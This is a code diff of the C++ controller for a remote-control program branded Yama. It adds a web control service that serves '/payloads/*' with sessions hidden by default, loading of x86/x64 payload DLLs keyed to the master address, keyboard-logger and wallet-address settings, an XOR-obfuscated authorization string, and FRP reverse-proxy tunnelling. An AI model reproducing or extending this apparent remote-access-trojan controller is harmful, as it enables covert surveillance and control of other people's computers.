+        THIS_CFG.SetStr("settings", "SN", getDeviceID(getHardwareID_V2()));
+        THIS_CFG.SetInt("settings", "HWIDVersion", 2);
     }
 
-    UPDATE_SPLASH(20, "正在初始化文件上传模块...");
-    int ret = InitFileUpload(GetHMAC(), 64, 50, Logf);
+    THIS_CFG.SetStr("settings", "PwdHash", GetPwdHash());
+    THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());
+    THIS_CFG.SetStr("settings", "Version", VERSION_STR);
+
+    m_IPConverter->GetLocalIPs(m_localPublicIP, m_localPrivateIP);
+
+    // Start Web Remote Control service (includes file download at /payloads/*)
+    UPDATE_SPLASH(16, "正在启动Web远程服务...");
+    auto webSvrPort = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
+    if (webSvrPort > 0) {
+        WebService().SetParentDlg(this);
+        // Use master password as web login password
+        if (!m_superPass.empty()) {
+            WebService().SetAdminPassword(m_superPass);
+        } else {
+            Mprintf("[WebService] Warning: No master password set, web login disabled\n");
+        }
+        // HideWebSessions: 1=hide (default), 0=show (for debugging)
+        WebService().SetHideWebSessions(THIS_CFG.GetInt("settings", "HideWebSessions", 1) != 0);
+        if (!WebService().Start(webSvrPort)) {
+            Mprintf("WebService start failed on port %d\n", webSvrPort);
+        } else {
+            Mprintf("WebService started on port %d (HideWebSessions=%d)\n",
+                    webSvrPort, WebService().GetHideWebSessions() ? 1 : 0);
+        }
+    }
+
+    UPDATE_SPLASH(18, "正在初始化文件上传模块...");
+    int ret = InitFileUpload({}, {}, GetHMAC(), 64, 50, Logf, GetUpperHash());
     g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, AfxGetInstanceHandle(), 0);
+
+    UPDATE_SPLASH(20, "正在加载IP数据库...");
+    int locType = THIS_CFG.GetInt("settings", "IPLocType", 0);
+    char path[MAX_PATH] = {};
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    switch (locType) {
+    case QQWry:
+        GET_FILEPATH(path, "qqwry.dat");
+        m_IPConverter = LoadFileQQWry(path);
+        break;
+    case Ip2Region:
+        GET_FILEPATH(path, "ip2region_v4.xdb");
+        m_IPConverter = LoadFileIp2Region(path);
+        break;
+    }
+    m_HasLocDB = m_IPConverter != nullptr;
+    if (!m_HasLocDB) {
+        m_IPConverter = new IPConverter(); //default
+    }
+    Mprintf("IP数据库加载: %s\n", m_HasLocDB ? "succeed" : "failed");
 
     UPDATE_SPLASH(25, "正在初始化视频墙...");
     m_GroupList = {"default"};
@@ -1156,19 +1794,18 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
         THIS_CFG.SetInt("settings", "MaxConnection", 2);
         THIS_APP->UpdateMaxConnection(2);
     }
-    if (GetPwdHash() == GetMasterHash()) {
-        auto pass = THIS_CFG.GetStr("settings", "superAdmin");
-        if (hashSHA256(pass) == GetPwdHash()) {
-            m_superPass = pass;
-        } else {
-            THIS_CFG.SetStr("settings", "superAdmin", "");
-        }
+    if (hashSHA256(m_superPass) != GetPwdHash()) {
+        m_superPass.clear();
+        THIS_CFG.SetStr("settings", "superAdmin", "");
     }
 
     UPDATE_SPLASH(35, "正在加载客户端数据库...");
     // 将"关于..."菜单项添加到系统菜单中。
-    SetWindowText(_T("Yama"));
+    SetWindowText(BRAND_APP_NAME_W);
     m_ClientMap->LoadFromFile(GetDbPath());
+
+    // Initialize notification manager
+    GetNotifyManager().Initialize();
 
     // IDM_ABOUTBOX 必须在系统命令范围内。
     ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
@@ -1176,25 +1813,31 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
     CMenu* pSysMenu = GetSystemMenu(FALSE);
     if (pSysMenu != NULL) {
-        BOOL bNameValid;
-        CString strAboutMenu;
-        bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
-        ASSERT(bNameValid);
-        if (!strAboutMenu.IsEmpty()) {
-            pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
-            pSysMenu->AppendMenuL(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
-        }
+        CString strAboutMenu = _TR("关于") + _T(" ") + BRAND_APP_NAME_W + _T("(&A)...");
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
     }
 
     UPDATE_SPLASH(40, "正在加载授权模块...");
     // 主控程序公网IP
     std::string ip = THIS_CFG.GetStr("settings", "master", "");
+    if (ip.empty()) {
+        ip = m_IPConverter ? m_IPConverter->getPublicIP() : "";
+        THIS_CFG.SetStr("settings", "master", ip);
+    }
+    if (ip.empty()) {
+        THIS_APP->MessageBoxL("请通过菜单设置公网地址!", "提示", MB_ICONINFORMATION);
+    }
     int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+    int webSvrPortCheck = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
+    if (webSvrPortCheck > 0 && webSvrPortCheck == port) {
+        THIS_APP->MessageBoxL("监听端口和Web服务端口冲突!", "提示", MB_ICONINFORMATION);
+    }
     std::string master = ip.empty() ? "" : ip + ":" + std::to_string(port);
     const Validation* v = GetValidation();
     if (!(strlen(v->Admin) && v->Port > 0)) {
         // IMPORTANT: For authorization only.
-        // NO NOT CHANGE: The program may not work if following code changed.
+        // DO NOT CHANGE: The program may not work if following code changed.
         PrintableXORCipher cipher;
         char buf1[] = { "? &!x1:x<!{<6 " }, buf2[] = { 'a','a','f',0 };
         cipher.process(buf1, strlen(buf1));
@@ -1220,6 +1863,13 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
         }
     }
 
+    // 获取有效地址（优先使用上级FRP配置）
+    std::string effectiveIP;
+    int effectivePort;
+    if (GetEffectiveMasterAddress(effectiveIP, effectivePort)) {
+        master = effectiveIP + ":" + std::to_string(effectivePort);
+    }
+
     UPDATE_SPLASH(50, "正在加载内核模块 (x86 DLL)...");
     g_2015RemoteDlg = this;
     m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
@@ -1232,6 +1882,12 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
     UPDATE_SPLASH(65, "正在加载内核模块 (x64 Bin)...");
     m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false, master);
+
+    UPDATE_SPLASH(67, "正在加载内核模块 (x86 TinyRun)...");
+    m_TinyRun[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master, true);
+
+    UPDATE_SPLASH(69, "正在加载内核模块 (x64 TinyRun)...");
+    m_TinyRun[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master, true);
 
     // 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
     //  执行此操作
@@ -1261,7 +1917,9 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
         int nMaxConnection = THIS_CFG.GetInt("settings", "MaxConnection");
         m_nMaxConnection = nMaxConnection <= 0 ? 10000 : nMaxConnection;
     }
-    const std::string method = THIS_CFG.GetStr("settings", "UDPOption", "0");
+	std::map<std::string, std::string> udpMap = { {"UDP", "0"}, {"KCP", "1"}};
+    std::string method = THIS_CFG.GetStr("settings", "UDPOption", "UDP");
+    method = udpMap.find(method) == udpMap.end() ? "0" : udpMap[method];
     int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
     int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
     int usingFRP = master.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
@@ -1270,15 +1928,62 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     memcpy(m_settings.WalletAddress, w.c_str(), w.length());
     m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
     m_settings.EnableLog = THIS_CFG.GetInt("settings", "EnableLog", 0);
-    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
-    m_needNotify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
-    SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
-    SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
-    m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
-    SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
+    strcpy(m_settings.FeedbackUrl, THIS_CFG.GetStr("settings", "FeedbackUrl", BRAND_URL_FEEDBACK).c_str());
+    strcpy(m_settings.HelpUrl, THIS_CFG.GetStr("settings", "HelpUrl", BRAND_URL_WIKI).c_str());
+    strcpy(m_settings.RequestAuthUrl, THIS_CFG.GetStr("settings", "RequestAuthUrl", BRAND_URL_REQUEST_AUTH).c_str());
+    strcpy(m_settings.GetPluginUrl, THIS_CFG.GetStr("settings", "GetPluginUrl", BRAND_URL_GET_PLUGIN).c_str());
+    m_bEnableFileV2 = THIS_CFG.GetInt("settings", "EnableFileV2", 0) != 0;
     m_runNormal = THIS_CFG.GetInt("settings", "RunNormal", 0);
-    SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
+
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    if (SubMenu) {
+        SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
+        m_needNotify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
+        SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
+        SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
+        SubMenu->CheckMenuItem(ID_PARAM_FILE_V2, m_bEnableFileV2 ? MF_CHECKED : MF_UNCHECKED);
+
+        // 互斥逻辑：三种模式 (RunNormal: 0=服务+SYSTEM, 1=普通模式, 2=服务+User)
+        if (m_runNormal == 0) {
+            // 服务+SYSTEM模式：勾选"守护主控程序"
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_CHECKED);
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_UNCHECKED);
+        }
+        else if (m_runNormal == 1) {
+            // 普通模式：两个都不勾选
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_UNCHECKED);
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_UNCHECKED);
+        }
+        else if (m_runNormal == 2) {
+            // 服务+User模式：勾选"降权运行"
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_UNCHECKED);
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_CHECKED);
+        }
+
+        m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
+        SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
+
+        std::string wallpaper = THIS_CFG.GetStr("settings", "Wallpaper", "");
+        m_PrivateScreenWallpaper = wallpaper.c_str();
+        SubMenu->CheckMenuItem(ID_PARAM_PRIVACY_WALLPAPER, !m_PrivateScreenWallpaper.IsEmpty() ? MF_CHECKED : MF_UNCHECKED);
+    }
+    // 查找IP定位子菜单并设置勾选状态
+    SubMenu = FindSubMenuByCommand(m_MainMenu.GetSubMenu(3), ID_LOCATION_QQWRY);
+    if (SubMenu) {
+        SubMenu->CheckMenuItem(ID_LOCATION_QQWRY, locType == QQWry ? MF_CHECKED : MF_UNCHECKED);
+        SubMenu->CheckMenuItem(ID_LOCATION_IP2REGION, locType == Ip2Region ? MF_CHECKED : MF_UNCHECKED);
+    }
+
+    // V2 私钥状态检查
+    SubMenu = m_MainMenu.GetSubMenu(1);  // 工具菜单
+    if (SubMenu) {
+        std::string v2Key = THIS_CFG.GetStr("settings", "V2PrivateKey", "");
+        m_v2KeyPath = v2Key;
+        bool v2KeyValid = !v2Key.empty() && GetFileAttributesA(v2Key.c_str()) != INVALID_FILE_ATTRIBUTES;
+        SubMenu->CheckMenuItem(ID_TOOL_V2_PRIVATEKEY, v2KeyValid ? MF_CHECKED : MF_UNCHECKED);
+        SubMenu->EnableMenuItem(ID_TOOL_V2_PRIVATEKEY, GetMasterHash() == GetPwdHash() ? MF_ENABLED : MF_GRAYED);
+    }
+
     std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, std::string(_TR("摄像头"))}, {SOFTWARE_TELEGRAM,  std::string(_TR("电报")) }};
     std::string str = myMap[n];
     LVCOLUMN lvColumn;
@@ -1300,9 +2005,25 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     SetTimer(TIMER_CHECK, max(1, tm) * 60 * 1000, NULL);
 #endif
     SetTimer(TIMER_HEARTBEAT_CHECK, 30 * 1000, NULL);
+    SetTimer(TIMER_REFRESH_LIST, 1000, NULL);
+
+    // 初始化状态栏统计
+    m_ullStartTime = GetTickCount64();
+    if (!pwd.empty()) {
+        std::string expireDate = ParseExpireDateFromPasscode(pwd);
+        m_strExpireDate = expireDate.c_str();
+    }
+    SetTimer(TIMER_STATUSBAR_UPDATE, 60 * 1000, NULL);  // 每分钟更新
+    UpdateStatusBarStats();  // 立即更新一次
 
     UPDATE_SPLASH(85, "正在启动FRP代理...");
-    m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);
+#ifdef _WIN64
+    if (InitLocalFrpsServer()) {  // 本地 FRPS 服务器 (仅 64 位，需先于 FRPC 启动)
+        Sleep(500);  // 等待 FRPS 启动完成
+    }
+#endif
+    InitFrpClients();
+    InitFrpcAuto();  // FRP 自动代理（由上级提供配置）
 
     UPDATE_SPLASH(90, "正在启动网络服务...");
     // 最后启动SOCKET
@@ -1314,116 +2035,757 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
     UPDATE_SPLASH(100, "启动完成!");
     CloseSplash();
+    Mprintf("主控程序启动完成: PwdHash= %s HMAC= %s. UpperHash= %s\n", GetPwdHash().c_str(), GetHMAC().c_str(), GetUpperHash().c_str());
+
+    // 延迟初始化状态栏（等待窗口完全显示后再设置分区宽度）
+    SetTimer(TIMER_STATUSBAR_INIT, 100, NULL);
 
     return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
+// FRP 线程参数
+struct FrpThreadParam {
+    CMy2015RemoteDlg* dlg;
+    int index;
+};
+
 DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param)
 {
-    CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
-    IPConverter cvt;
+    FrpThreadParam* p = (FrpThreadParam*)param;
+    CMy2015RemoteDlg* This = p->dlg;
+    int idx = p->index;
+    delete p;
+
+    if (idx < 0 || idx >= (int)This->m_frpInstances.size()) {
+        Mprintf("[FRP-%d] Invalid instance index\n", idx);
+        return -1;
+    }
+
+    auto& inst = This->m_frpInstances[idx];
+
+    // 生成配置文件路径 (index=0 使用 frpc.ini 保持兼容)
+    std::string cfgPath = GetFrpSettingsPath();
+    if (idx > 0) {
+        if (cfgPath.size() > 4 && cfgPath.substr(cfgPath.size() - 4) == ".ini") {
+            cfgPath = cfgPath.substr(0, cfgPath.size() - 4);
+        }
+        cfgPath += "." + std::to_string(idx) + ".ini";
+    }
+
+    Mprintf("[FRP-%d] Config: %s, Server: %s\n", idx, cfgPath.c_str(), inst.serverAddr.c_str());
+
+    if (This->m_frpRun == nullptr) {
+        Mprintf("[FRP-%d] m_frpRun is null\n", idx);
+        return -1;
+    }
+
+    Mprintf("[FRP-%d] Calling m_frpRun...\n", idx);
+    int n = 0;
+    do {
+        inst.status = STATUS_RUN;
+        n = This->m_frpRun((char*)cfgPath.c_str(), &inst.status);
+        if (n) {
+            Mprintf("[FRP-%d] Connection failed: %d\n", idx, n);
+            WAIT_n(!This->isClosed, 10, 1000);
+            if (This->isClosed) break;
+        }
+    } while (n);
+
+    inst.hThread = NULL;
+    Mprintf("[FRP-%d] Thread stopped\n", idx);
+
+    return n;
+}
+
+// 检测当前系统是否支持 FRP 功能
+// 返回: true=支持, false=不支持
+// logPrefix: 日志前缀（如 "[FRP]" 或 "[FRP-Auto]"），为空则不打印日志
+static bool IsFrpSupported(const char* logPrefix = nullptr)
+{
+#ifndef _WIN64
+    if (logPrefix) {
+        Mprintf("%s 32位版本不支持 FRP 功能\n", logPrefix);
+    }
+    return false;
+#endif
+
+    // 检测 Windows 版本，frpc.dll 使用 Go 1.21+ 编译，需要 Windows 10 或更高版本
+    // 使用 RtlGetVersion 获取真实版本号（不受 manifest 影响）
+    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+    RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (hNtdll) {
+        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
+        if (pRtlGetVersion) pRtlGetVersion(&osvi);
+    }
+
+    if (osvi.dwMajorVersion < 10) {
+        if (logPrefix) {
+            Mprintf("%s 当前系统版本 %d.%d，低于 Windows 10，不支持 FRP 功能\n",
+                    logPrefix, osvi.dwMajorVersion, osvi.dwMinorVersion);
+        }
+        return false;
+    }
+
+    return true;
+}
+
+void CMy2015RemoteDlg::InitFrpClients()
+{
+    // 显示初始化消息
 #ifdef _WIN64
     int usingFRP = THIS_CFG.GetInt("frp", "UseFrp");
 #else
     int usingFRP = 0;
 #endif
+
+    // 检查是否有上级配置的 FRP
+    std::string frpConfigStr = THIS_CFG.GetStr("settings", "FrpConfig", "");
+    std::string frpAutoServer = THIS_CFG.GetStr("frp_auto", "server", "");
+    int frpAutoPort = THIS_CFG.GetInt("frp_auto", "remotePort", 0);
+    bool hasUpperFrp = !frpConfigStr.empty() || (!frpAutoServer.empty() && frpAutoPort > 0);
     std::string ip = THIS_CFG.GetStr("settings", "master", "");
-    CString tip = !ip.empty() && ip != cvt.getPublicIP() ?
-        CString(ip.c_str()) + _L(" 必须是\"公网IP\"或反向代理服务器IP") :
-        _L("请设置\"公网IP\"，或使用反向代理服务器的IP");
-    tip += usingFRP ? _TR("[使用FRP]") : _TR("[未使用FRP]");
+
+    CString tip;
+    if (hasUpperFrp) {
+        // 使用上级配置的 FRP，无需关心公网 IP
+        tip = _L("使用上级配置的FRP代理");
+    } else {
+        std::string firstIP = GetFirstMasterIP(ip);
+        tip = !ip.empty() && firstIP != m_IPConverter->getPublicIP() ?
+            CString(ip.c_str()) + _L(" 必须是\"公网IP\"或反向代理服务器IP") :
+            _L("请设置\"公网IP\"，或使用反向代理服务器的IP");
+        tip += usingFRP ? _TR("[使用FRP]") : _TR("[未使用FRP]");
+    }
     CharMsg* msg = new CharMsg(tip);
-    This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+    PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
 
-	auto langDir = THIS_CFG.GetStr("settings", "LangDir", "./lang");
-	langDir = langDir.empty() ? "./lang" : langDir;
-	if (!PathFileExists(langDir.c_str())) {
-		CharMsg* msg = new CharMsg(_TR("请通过“扩展”菜单指定语言包目录以支持多语言"));
-		This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
-	}
-
-#ifdef _WIN64
-    usingFRP = ip.empty() ? 0 : usingFRP;
-#else
-    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
-    This->m_hFRPThread = NULL;
-    return 0x20250820;
-#endif
-    if (usingFRP) {
-        This->m_frpStatus = STATUS_RUN;
+    auto langDir = THIS_CFG.GetStr("settings", "LangDir", "./lang");
+    langDir = langDir.empty() ? "./lang" : langDir;
+    if (!PathFileExists(langDir.c_str())) {
+        CharMsg* msg = new CharMsg(_TR("请通过\"扩展\"菜单指定语言包目录以支持多语言"));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+    }
+    if (!m_HasLocDB) {
+        CharMsg* msg = new CharMsg(_TR("请将IP数据库文件放于当前程序目录"));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
     }
 
-    Mprintf("[FRP] Proxy thread start running\n");
+    if (!m_superPass.empty() && GetUpperHash() == GetPwdHash()) {
+        // 检查 V2 私钥配置
+        std::string v2KeyPath = m_v2KeyPath;
+        if (v2KeyPath.empty()) {
+            CharMsg* msg = new CharMsg(_TR("V2私钥未配置，请通过\"工具→V2私钥设置\"菜单选择私钥文件"));
+            PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        }
+        else if (GetFileAttributesA(v2KeyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            std::string tip = std::string(_TR("V2私钥文件不存在: ")) + v2KeyPath;
+            CharMsg* msg = new CharMsg(tip.c_str());
+            PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        }
+    }
 
-    do {
-        DWORD size = 0;
-        LPBYTE frpc = ReadResource(IDR_BINARY_FRPC, size);
-        if (frpc == nullptr) {
-            Mprintf("Failed to read FRP DLL\n");
-            break;
-        }
-        HMEMORYMODULE hDLL = MemoryLoadLibrary(frpc, size);
-        SAFE_DELETE_ARRAY(frpc);
-        if (hDLL == NULL) {
-            Mprintf("Failed to load FRP DLL\n");
-            break;
-        }
-        typedef int (*Run)(char* cstr, int* ptr);
-        Run run = (Run)MemoryGetProcAddress(hDLL, "Run");
-        if (!run) {
-            Mprintf("Failed to get FRP function\n");
-            MemoryFreeLibrary(hDLL);
-            break;
-        }
-        std::string s = GetFrpSettingsPath();
-        int n = run((char*)s.c_str(), &(This->m_frpStatus));
-        if (n) {
-            Mprintf("Failed to run FRP function\n");
-            This->PostMessage(WM_SHOWERRORMSG,(WPARAM)new CString("反向代理: 公网IP和代理设置是否正确? FRP 服务端是否运行?"));
-        }
-        // Free FRP DLL will cause crash
-        // Do NOT use MemoryFreeLibrary and 528 bytes memory leak detected when exiting master
-        // MemoryFreeLibrary(hDLL);
-    } while (false);
+    usingFRP = ip.empty() ? 0 : usingFRP;
+    if (!usingFRP) return;
 
-    SAFE_CLOSE_HANDLE(This->m_hFRPThread);
-    This->m_hFRPThread = NULL;
-    Mprintf("[FRP] Proxy thread stop running\n");
+    // 检测系统是否支持 FRP（64位 + Windows 10+）
+    if (!IsFrpSupported("[FRP]")) {
+        CharMsg* msg = new CharMsg(_TR("FRP 功能需要 64 位 Windows 10 或更高版本"));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        return;
+    }
 
-    return 0x20250731;
+    // 加载 FRP DLL（只加载一次）
+    DWORD size = 0;
+    LPBYTE frpcData = ReadResource(IDR_BINARY_FRPC, size);
+    if (frpcData == nullptr) {
+        Mprintf("[FRP] Failed to read FRP DLL\n");
+        return;
+    }
+    m_hFrpDll = MemoryLoadLibrary(frpcData, size);
+    SAFE_DELETE_ARRAY(frpcData);
+    if (m_hFrpDll == NULL) {
+        Mprintf("[FRP] Failed to load FRP DLL\n");
+        return;
+    }
+    m_frpRun = (FrpRunFunc)MemoryGetProcAddress(m_hFrpDll, "Run");
+    if (!m_frpRun) {
+        Mprintf("[FRP] Failed to get FRP function\n");
+        return;
+    }
+
+    // 解析多个服务端地址
+    auto servers = StringToVector(ip, ';');
+    Mprintf("[FRP] Starting %d connections\n", (int)servers.size());
+
+    // 先添加所有实例（避免 vector 重新分配导致的竞争问题）
+    m_frpInstances.reserve(servers.size());
+    for (size_t i = 0; i < servers.size(); ++i) {
+        FrpInstance inst;
+        inst.serverAddr = servers[i];
+        inst.status = STATUS_RUN;
+        m_frpInstances.push_back(inst);
+    }
+
+    // 再创建所有线程
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        FrpThreadParam* param = new FrpThreadParam{ this, (int)i };
+        m_frpInstances[i].hThread = CreateThread(NULL, 0, StartFrpClient, param, 0, NULL);
+    }
 }
+
+void CMy2015RemoteDlg::StopAllFrpClients()
+{
+    if (m_frpInstances.empty()) {
+        Mprintf("[FRP] No instances to stop\n");
+        return;
+    }
+
+    // 通知所有实例退出
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        m_frpInstances[i].status = STATUS_EXIT;
+    }
+
+    // 等待所有线程结束
+    for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+        while (m_frpInstances[i].hThread) {
+            Sleep(20);
+        }
+    }
+
+    m_frpInstances.clear();
+    Mprintf("[FRP] All connections stopped\n");
+    // 注意：不释放 m_hFrpDll，会导致崩溃
+}
+
+//////////////////////////////////////////////////////////////////////////
+// 本地 FRPS 服务器 (仅 64 位支持)
+//////////////////////////////////////////////////////////////////////////
+
+#ifdef _WIN64
+bool CMy2015RemoteDlg::InitLocalFrpsServer()
+{
+    // 检查是否启用本地 FRPS
+    FrpsConfig config = CFrpsForSubDlg::GetFrpsConfig();
+    if (!config.enabled || !config.localFrps) {
+        Mprintf("[FRPS] Local FRPS not enabled\n");
+        return false;
+    }
+
+    // 检测系统是否支持 FRPS（64位 + Windows 10+）
+    if (!IsFrpSupported("[FRPS]")) {
+        CharMsg* msg = new CharMsg(_TR("FRP 功能需要 64 位 Windows 10 或更高版本"));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        return false;
+    }
+
+    if (config.token.empty() || config.port <= 0) {
+        Mprintf("[FRPS] Invalid config: token empty or port invalid\n");
+        return false;
+    }
+
+    // 加载 FRPS DLL
+    DWORD size = 0;
+    LPBYTE frpsData = ReadResource(IDR_BINARY_FRPS, size);
+    if (frpsData == nullptr) {
+        Mprintf("[FRPS] Failed to read FRPS DLL from resource\n");
+        return false;
+    }
+
+    m_hFrpsDll = MemoryLoadLibrary(frpsData, size);
+    SAFE_DELETE_ARRAY(frpsData);
+    if (m_hFrpsDll == NULL) {
+        Mprintf("[FRPS] Failed to load FRPS DLL\n");
+        return false;
+    }
+
+    m_frpsRunSimpleWithToken = (FrpsRunSimpleWithTokenFunc)MemoryGetProcAddress(m_hFrpsDll, "RunSimpleWithToken");
+    if (!m_frpsRunSimpleWithToken) {
+        Mprintf("[FRPS] Failed to get RunSimpleWithToken function\n");
+        // 注意：不释放 Go DLL，运行时已启动，释放会崩溃
+        return false;
+    }
+
+    // 启动 FRPS 服务器线程
+    m_frpsStatus = STATUS_RUN;
+    m_hFrpsThread = CreateThread(NULL, 0, StartLocalFrpsServer, this, 0, NULL);
+    if (m_hFrpsThread == NULL) {
+        Mprintf("[FRPS] Failed to create FRPS thread\n");
+        m_frpsStatus = STATUS_UNKNOWN;
+        // 注意：不释放 Go DLL，会导致崩溃
+        return false;
+    }
+
+    Mprintf("[FRPS] Local FRPS server starting on port %d\n", config.port);
+
+    return true;
+}
+
+DWORD WINAPI CMy2015RemoteDlg::StartLocalFrpsServer(LPVOID param)
+{
+    CMy2015RemoteDlg* pThis = (CMy2015RemoteDlg*)param;
+    if (!pThis || !pThis->m_frpsRunSimpleWithToken) return 1;
+
+    FrpsConfig config = CFrpsForSubDlg::GetFrpsConfig();
+
+    // 调用 RunSimpleWithToken(token, bindPort, logFile, logLevel, logMaxDays, statusPtr)
+    // 传 NULL 表示使用默认值 (./frps.log, info, 60)
+    int result = pThis->m_frpsRunSimpleWithToken(
+        (char*)config.token.c_str(),
+        config.port,
+        NULL,  // logFile: 使用默认值 ./frps.log
+        NULL,  // logLevel: 使用默认值 info
+        0,     // logMaxDays: 使用默认值 60
+        &pThis->m_frpsStatus
+    );
+
+    Mprintf("[FRPS] Server stopped with result: %d\n", result);
+    pThis->m_hFrpsThread = NULL;
+    return result;
+}
+
+void CMy2015RemoteDlg::StopLocalFrpsServer()
+{
+    if (m_hFrpsThread == NULL) {
+        return;
+    }
+
+    Mprintf("[FRPS] Stopping local FRPS server...\n");
+    m_frpsStatus = STATUS_EXIT;
+
+    // 等待线程结束（轮询方式，与 FRPC 保持一致）
+    while (m_hFrpsThread) {
+        Sleep(20);
+    }
+
+    // 注意：不释放 m_hFrpsDll，会导致崩溃
+    Mprintf("[FRPS] Local FRPS server stopped\n");
+}
+#endif
+
+//////////////////////////////////////////////////////////////////////////
+// FRP 自动代理（由上级提供配置）
+//////////////////////////////////////////////////////////////////////////
+
+// 解析 FRP 自动代理配置
+// 输入格式: serverAddr:serverPort-remotePort-expireDate-privilegeKey
+// 示例: frp.example.com:7000-20080-20260323-a1b2c3d4... (自定义FRP: 32字符 privilegeKey)
+// 示例: frp.example.com:7000-20080-20260323-ENC:xxx     (官方FRP: 编码的 token)
+CMy2015RemoteDlg::FrpAutoConfig CMy2015RemoteDlg::ParseFrpAutoConfig(const std::string& config, bool heartbeat)
+{
+    FrpAutoConfig cfg;
+    if (config.empty()) return cfg;
+
+    // 格式: serverAddr:serverPort-remotePort-expireDate-authValue
+    // authValue 可以是:
+    //   - 32字符十六进制: 自定义 FRP 模式 (privilegeKey = MD5(token + timestamp))
+    //   - ENC:xxx: 官方 FRP 模式 (编码的 token)
+    // 注意：域名可能包含 '-'，所以需要从后往前解析
+
+    // 从最后一个 '-' 提取 authValue
+    size_t lastDash = config.rfind('-');
+    if (lastDash == std::string::npos || lastDash == 0) {
+        Mprintf("[FRP-Auto] 配置格式错误（缺少authValue分隔符）: %s\n", config.c_str());
+        return cfg;
+    }
+    cfg.privilegeKey = config.substr(lastDash + 1);
+
+    // 检测是否为编码的 token (官方 FRP 模式)
+    cfg.isEncodedToken = (cfg.privilegeKey.length() >= 4 && cfg.privilegeKey.substr(0, 4) == "ENC:");
+
+    // 验证 authValue 格式
